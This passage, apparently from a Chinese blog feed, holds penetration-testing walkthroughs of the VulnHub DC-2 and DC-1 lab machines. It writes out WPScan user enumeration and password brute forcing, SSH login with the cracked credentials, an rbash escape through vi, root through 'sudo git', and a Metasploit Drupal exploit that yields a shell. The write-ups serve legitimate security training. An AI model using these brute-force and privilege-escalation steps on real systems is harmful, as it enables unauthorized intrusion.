operator">|</span> Author<span class="token operator">:</span> the WordPress team <span class="token operator">|</span> Author URI<span class="token operator">:</span> https<span class="token operator">:</span><span class="token comment">//wordpress.org/</span> <span class="token operator">|</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> Css Style In <span class="token function">Homepage</span> <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> Version<span class="token operator">:</span> <span class="token number">1.2</span> <span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">%</span> confidence<span class="token punctuation">)</span> <span class="token operator">|</span> Found By<span class="token operator">:</span> <span class="token function">Style</span> <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token operator">-</span> http<span class="token operator">:</span><span class="token comment">//dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Enumerating <span class="token function">Users</span> <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span> Brute Forcing Author IDs <span class="token operator">-</span> Time<span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">100.00</span><span class="token operator">%</span> Time<span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token function">User</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> admin <span class="token operator">|</span> Found By<span class="token operator">:</span> Rss <span class="token function">Generator</span> <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confirmed By<span class="token operator">:</span> <span class="token operator">|</span>  Wp Json <span class="token function">Api</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>   <span class="token operator">-</span> http<span class="token operator">:</span><span class="token comment">//dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span> <span class="token operator">|</span>  Author Id Brute Forcing <span class="token operator">-</span> Author <span class="token function">Pattern</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  Login Error <span class="token function">Messages</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> jerry <span class="token operator">|</span> Found By<span class="token operator">:</span> Wp Json <span class="token function">Api</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  <span class="token operator">-</span> http<span class="token operator">:</span><span class="token comment">//dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span> <span class="token operator">|</span> Confirmed By<span class="token operator">:</span> <span class="token operator">|</span>  Author Id Brute Forcing <span class="token operator">-</span> Author <span class="token function">Pattern</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span>  Login Error <span class="token function">Messages</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> tom <span class="token operator">|</span> Found By<span class="token operator">:</span> Author Id Brute Forcing <span class="token operator">-</span> Author <span class="token function">Pattern</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span> <span class="token operator">|</span> Confirmed By<span class="token operator">:</span> Login Error <span class="token function">Messages</span> <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> No WPScan API Token given<span class="token punctuation">,</span> as a result vulnerability data has not been output<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> You can get a free API token with <span class="token number">25</span> daily requests by registering at https<span class="token operator">:</span><span class="token comment">//wpscan.com/register</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Finished<span class="token operator">:</span> Thu Nov <span class="token number">23</span> <span class="token number">07</span><span class="token operator">:</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">52</span> <span class="token number">2023</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Requests Done<span class="token operator">:</span> <span class="token number">74</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Cached Requests<span class="token operator">:</span> <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Data Sent<span class="token operator">:</span> <span class="token number">16.619</span> KB<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Data Received<span class="token operator">:</span> <span class="token number">20.957</span> MB<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Memory used<span class="token operator">:</span> <span class="token number">171.031</span> MB<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Elapsed time<span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">03</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现有三个用户，admin,jerry,tom,对这三个用户进行密码爆破,写入到user.txt文件当中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">wpscan <span class="token operator">--</span>url http<span class="token operator">:</span><span class="token comment">//dc-2 -U user.txt -P pwsswd.txt</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Performing password attack on Xmlrpc against <span class="token number">4</span> user<span class="token operator">/</span>s<span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> <span class="token operator">-</span> jerry <span class="token operator">/</span> adipiscing                                                                                <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> <span class="token operator">-</span> tom <span class="token operator">/</span> parturient    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>爆破出jerry和tom的密码尝试在默认后台&#x2F;wp-admin进行登录<br><img src="/2023/05/23/DC-2/image-20231128203016107.png"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>利用jerry账号登录后台，在Pages中找到flag2<br><img src="/2023/05/23/DC-2/image-20231128203032014.png"><br>如果你不能利用WordPress并采取快捷方式，还有另一种方法。<br>希望你找到了另一个切入点。<br>这里希望我们换另一个切入点，在端口扫描的时候除了80端口之外还有7744端口，看看是否能利用ssh连接，利用jerry &#x2F; adipiscing tom &#x2F; parturient<br>进行ssh连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> tom@192.168.245.138 <span class="token parameter variable">-p</span> <span class="token number">7744</span>The authenticity of <span class="token function">host</span> <span class="token string">'[192.168.245.138]:7744 ([192.168.245.138]:7744)'</span> can<span class="token string">'t be established.ED25519 key fingerprint is SHA256:JEugxeXYqsY0dfaV/hdSQN31Pp0vLi5iGFvQb8cB1YA.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yPlease type '</span><span class="token function">yes</span><span class="token string">', '</span>no<span class="token string">' or the fingerprint: yesWarning: Permanently added '</span><span class="token punctuation">[</span><span class="token number">192.168</span>.245.138<span class="token punctuation">]</span>:7744<span class="token string">' (ED25519) to the list of known hosts.tom@192.168.245.138'</span>s password: The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> theindividual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Dec <span class="token number">31</span> <span class="token number">20</span>:18:39 <span class="token number">2022</span> from <span class="token number">192.168</span>.245.156tom@DC-2:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功利用tom账号登录</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@DC-2:~$ <span class="token function">whoami</span>-rbash: whoami: <span class="token builtin class-name">command</span> not foundtom@DC-2:~$ <span class="token function">ls</span>flag3.txt  usrtom@DC-2:~$ <span class="token function">cat</span> flag.txt-rbash: cat: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现部分命令不能用，利用vi修改flag3.txt查看flag，Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.可怜的老汤姆一直在追赶杰瑞，也许他需要su一下来释放这些压力</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tom@DC-2:~$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span>/bin/rbashtom@DC-2:~$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/home/tom/usr/bintom@DC-2:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看当前的shell和当前用户的环境变量，&#x2F;bin&#x2F;rbash，是一个受限的bash（restrict bash），限制执行命令，修改环境变量，重定向，修改shell设置等操作，由于当前bash受限，根据提示可能需要su一下释放压力，可以尝试利用vi来进行rbash的绕过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> flag3.txt:set <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/sh:shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/05/23/DC-2/image-20231128203056948.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/sbin:/usr/bin:/sbin:/bin$ <span class="token function">cat</span> flag3.txtPoor old Tom is always running after Jerry. Perhaps he should <span class="token function">su</span> <span class="token keyword">for</span> all the stress he causes.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>切换Jerry账号</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">su</span> jerryPassword: jerry@DC-2:/home/tom$ jerry@DC-2:/home/tom$ <span class="token function">ls</span>ls: cannot <span class="token function">open</span> directory .: Permission deniedjerry@DC-2:/home/tom$ <span class="token function">ls</span> <span class="token environment constant">$PATH</span>ls: cannot access /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games: No such <span class="token function">file</span> or directoryjerry@DC-2:/home/tom$ <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>jerry@DC-2:/home$ <span class="token function">ls</span>jerry  tomjerry@DC-2:/home$ <span class="token builtin class-name">cd</span> jerryjerry@DC-2:~$ <span class="token function">ls</span>flag4.txtjerry@DC-2:~$ <span class="token function">cat</span> flag4.txtGood to see that you<span class="token string">'ve made it this far - but you'</span>re not home yet. You still need to get the final flag <span class="token punctuation">(</span>the only flag that really counts<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">)</span>.  No hints here - you're on your own now.  :-<span class="token punctuation">)</span>Go on - <span class="token function">git</span> outta here<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>jerry@DC-2:~$ <span class="token function">id</span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>jerry<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>jerry<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>jerry<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在当前目录没权限，切换到jerry的目录获得flag4.txt，很高兴看到你已经走了这么远，但你还没有回家。<br>你仍然需要得到最终的标志（唯一真正重要的标志！！）。<br>这里没有提示-你现在只能靠自己了。：-）<br>快离开这里！！！！</p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>唯一的标志root权限，尝试SUID提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jerry@DC-2:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/sudo/usr/bin/chfn/usr/bin/chsh/usr/bin/passwd/usr/bin/procmail/usr/bin/at/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/bin/umount/bin/mount/bin/sujerry@DC-2:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>Matching Defaults entries <span class="token keyword">for</span> jerry on DC-2:    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/binUser jerry may run the following commands on DC-2:    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/gitjerry@DC-2:~$ <span class="token function">sudo</span> <span class="token function">git</span> branch <span class="token parameter variable">--help</span> configGIT-BRANCH<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                               Git Manual                              GIT-BRANCH<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>NAME       git-branch - List, create, or delete branchesSYNOPSIS       <span class="token function">git</span> branch <span class="token punctuation">[</span>--color<span class="token punctuation">[</span><span class="token operator">=</span><span class="token operator">&lt;</span>when<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">|</span> --no-color<span class="token punctuation">]</span> <span class="token punctuation">[</span>-r <span class="token operator">|</span> -a<span class="token punctuation">]</span>               <span class="token punctuation">[</span>--list<span class="token punctuation">]</span> <span class="token punctuation">[</span>-v <span class="token punctuation">[</span>--abbrev<span class="token operator">=</span><span class="token operator">&lt;</span>length<span class="token operator">></span> <span class="token operator">|</span> --no-abbrev<span class="token punctuation">]</span><span class="token punctuation">]</span>               <span class="token punctuation">[</span>--column<span class="token punctuation">[</span><span class="token operator">=</span><span class="token operator">&lt;</span>options<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">|</span> --no-column<span class="token punctuation">]</span>               <span class="token punctuation">[</span><span class="token punctuation">(</span>--merged <span class="token operator">|</span> --no-merged <span class="token operator">|</span> --contains<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>commit<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>pattern<span class="token operator">></span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>       <span class="token function">git</span> branch <span class="token punctuation">[</span>--set-upstream <span class="token operator">|</span> <span class="token parameter variable">--track</span> <span class="token operator">|</span> --no-track<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token operator">&lt;</span>branchname<span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>start-point<span class="token operator">></span><span class="token punctuation">]</span>       <span class="token function">git</span> branch <span class="token punctuation">(</span>--set-upstream-to<span class="token operator">=</span><span class="token operator">&lt;</span>upstream<span class="token operator">></span> <span class="token operator">|</span> <span class="token parameter variable">-u</span> <span class="token operator">&lt;</span>upstream<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>branchname<span class="token operator">></span><span class="token punctuation">]</span>       <span class="token function">git</span> branch --unset-upstream <span class="token punctuation">[</span><span class="token operator">&lt;</span>branchname<span class="token operator">></span><span class="token punctuation">]</span>       <span class="token function">git</span> branch <span class="token punctuation">(</span>-m <span class="token operator">|</span> -M<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>oldbranch<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">&lt;</span>newbranch<span class="token operator">></span>       <span class="token function">git</span> branch <span class="token punctuation">(</span>-d <span class="token operator">|</span> -D<span class="token punctuation">)</span> <span class="token punctuation">[</span>-r<span class="token punctuation">]</span> <span class="token operator">&lt;</span>branchname<span class="token operator">></span><span class="token punctuation">..</span>.       <span class="token function">git</span> branch --edit-description <span class="token punctuation">[</span><span class="token operator">&lt;</span>branchname<span class="token operator">></span><span class="token punctuation">]</span>DESCRIPTION       If <span class="token parameter variable">--list</span> is given, or <span class="token keyword">if</span> there are no non-option arguments, existing branches are listed<span class="token punctuation">;</span>       the current branch will be highlighted with an asterisk. Option <span class="token parameter variable">-r</span> causes the       remote-tracking branches to be listed, and option <span class="token parameter variable">-a</span> shows both <span class="token builtin class-name">local</span> and remote branches.       If a <span class="token operator">&lt;</span>pattern<span class="token operator">></span> is given, it is used as a shell wildcard to restrict the output to matching       branches. If multiple patterns are given, a branch is shown <span class="token keyword">if</span> it matches any of the       patterns. Note that when providing a <span class="token operator">&lt;</span>pattern<span class="token operator">></span>, you must use --list<span class="token punctuation">;</span> otherwise the <span class="token builtin class-name">command</span>       is interpreted as branch creation.       With --contains, shows only the branches that contain the named commit <span class="token punctuation">(</span>in other words,       the branches whose tip commits are descendants of the named commit<span class="token punctuation">)</span>. With --merged, only       branches merged into the named commit <span class="token punctuation">(</span>i.e. the branches whose tip commits are reachable<span class="token operator">!</span>/bin/sh<span class="token comment">#whoami</span>root<span class="token comment"># find / -name *flag*.txt</span>/home/tom/flag3.txt/home/jerry/flag4.txt/root/final-flag.txt<span class="token comment"># cat /root/final-flag.txt</span> __    __     _ _       _                    _ / / /<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>___<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>   __<span class="token operator">|</span> <span class="token operator">|</span> ___  _ __   ___  / <span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / _ <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span>  / _` <span class="token operator">|</span>/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ \ / _ \/  / \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/   \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   Congratulatons!!!A special thanks to all those who sent me tweetsand provided me with feedback - it'</span>s all greatlyappreciated.If you enjoyed this CTF, send me a tweet via @DCAU7.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>git是root权限尝试git提权,提权后可以看到最终的flag。<br>在git输出过长的情况下，会让你翻页，此时不翻页，直接输入!&#x2F;bin&#x2F;sh 可以切换到shell中。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://tuzk1.top/posts/2df4f546.html#toc-heading-8">Vulnhub靶机系列: DC-2 | Tuzk1</a></p><p><a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> DC-2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2023/05/12/DC-1/"/>
      <url>/2023/05/12/DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>靶机下载：<a href="https://www.vulnhub.com/entry/dc-1,292/%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E5%AF%BC%E5%85%A5vm">https://www.vulnhub.com/entry/dc-1,292/，下载后导入vm</a> ware，共有5个flag。</p><p><img src="/2023/05/12/DC-1/image-20231128193453191.png"></p><p>搭建好靶场后，在kali中使用nmap扫描，-sn 存活探测，–min-rate 最小发包速率，-r 关闭域名解析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">─$ nmap <span class="token number">192.168</span>.245.128/24 <span class="token parameter variable">-sn</span> --min-rate <span class="token number">2222</span> <span class="token parameter variable">-r</span>Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-11-02 02:40 EDTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.1Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0014s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.2Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00094s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.128Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000077s latency<span class="token punctuation">)</span>.Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.178Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00065s latency<span class="token punctuation">)</span>.Nmap done: <span class="token number">256</span> IP addresses <span class="token punctuation">(</span><span class="token number">4</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.59</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认靶机地址为178，对其进行端口扫描，-p- 全端口，-PN 禁止ping其他主机，-sS TCP扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ nmap <span class="token number">192.168</span>.245.178 -p- --min-rate <span class="token number">8888</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-PN</span> <span class="token parameter variable">-sS</span>                     Starting Nmap <span class="token number">7.93</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2023</span>-11-02 02:48 EDTNmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.245.178Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00031s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">65531</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>PORT      STATE SERVICE<span class="token number">22</span>/tcp    <span class="token function">open</span>  <span class="token function">ssh</span><span class="token number">80</span>/tcp    <span class="token function">open</span>  http<span class="token number">111</span>/tcp   <span class="token function">open</span>  rpcbind<span class="token number">43136</span>/tcp <span class="token function">open</span>  unknownNmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.58</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开放22和80、111、43136端口，先从80端口入手<img src="/2023/05/12/DC-1/1668303124583-2b8cc7ed-f521-45da-9bf3-56a9bfcef99a.png" alt="image.png">Drupal是一个免费的开源内容管理系统（CMS），拥有庞大的支持性社区。全球数以百万计的人和组织使用它来构建和维护他们的网站。先用msf看看有什么漏洞。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> search drupal                                                                                                                                                 Matching Modules                                                                                                                                 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>                                                                                                                                                                                                                                                                                     <span class="token comment">#  Name                                           Disclosure Date  Rank       Check  Description                                              </span>   -  ----                                           ---------------  ----       -----  -----------                                                 <span class="token number">0</span>  exploit/unix/webapp/drupal_coder_exec          <span class="token number">2016</span>-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution                <span class="token number">1</span>  exploit/unix/webapp/drupal_drupalgeddon2       <span class="token number">2018</span>-03-28       excellent  Yes    Drupal Drupalgeddon <span class="token number">2</span> Forms API Property Injection          <span class="token number">2</span>  exploit/multi/http/drupal_drupageddon          <span class="token number">2014</span>-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection               <span class="token number">3</span>  auxiliary/gather/drupal_openid_xxe             <span class="token number">2012</span>-10-17       normal     Yes    Drupal OpenID External Entity Injection                     <span class="token number">4</span>  exploit/unix/webapp/drupal_restws_exec         <span class="token number">2016</span>-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution              <span class="token number">5</span>  exploit/unix/webapp/drupal_restws_unserialize  <span class="token number">2019</span>-02-20       normal     Yes    Drupal RESTful Web Services unserialize<span class="token punctuation">(</span><span class="token punctuation">)</span> RCE   <span class="token number">6</span>  auxiliary/scanner/http/drupal_views_user_enum  <span class="token number">2010</span>-07-02       normal     Yes    Drupal Views Module Users Enumeration   <span class="token number">7</span>  exploit/unix/webapp/php_xmlrpc_eval            <span class="token number">2005</span>-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code ExecutionInteract with a module by name or index. For example info <span class="token number">7</span>, use <span class="token number">7</span> or use exploit/unix/webapp/php_xmlrpc_eval<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现有msf中有，search</p><p><img src="/2023/05/12/DC-1/image-20231128195222828.png"></p><p>找到对应的msf，use 0,options填上地址run!</p><p><img src="/2023/05/12/DC-1/image-20231128195309416.png"></p><p>成功获得shell</p><p><img src="/2023/05/12/DC-1/image-20231128195345351.png"></p><p>拿到shel了，ls查看当前目录下有哪些文件，flag1.txt，利用python切换一个交互式的shell，<code>python -c import pty;pty.spawn(&#39;/bin/sh&#39;)</code>,这将创建一个伪终端并在其中执行&#x2F;bin&#x2F;sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/sh")'</span>$ <span class="token function">ls</span><span class="token function">ls</span>COPYRIGHT.txt       LICENSE.txt      cron.php     misc        sitesINSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt    modules     themesINSTALL.pgsql.txt   README.txt       includes     profiles    update.phpINSTALL.sqlite.txt  UPGRADE.txt      index.php    robots.txt  web.configINSTALL.txt         authorize.php    install.php  scripts     xmlrpc.php$ <span class="token builtin class-name">pwd</span><span class="token builtin class-name">pwd</span>/var/www$ <span class="token function">cat</span> flag1.txt<span class="token function">cat</span> flag1.txtEvery good CMS needs a config <span class="token function">file</span> - and so <span class="token keyword">do</span> you.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag1.txt是个提示，Every good CMS needs a config file - and so do you. 所有CMS都需要一个好的配置文件，你也不例外。提示我们去找drupal的配置文件，drupal的配置文件一般都在sites&#x2F;default文件夹下。</p><p><img src="/2023/05/12/DC-1/image-20231128200018758.png" alt="image-20231128200018758"><br>flag2 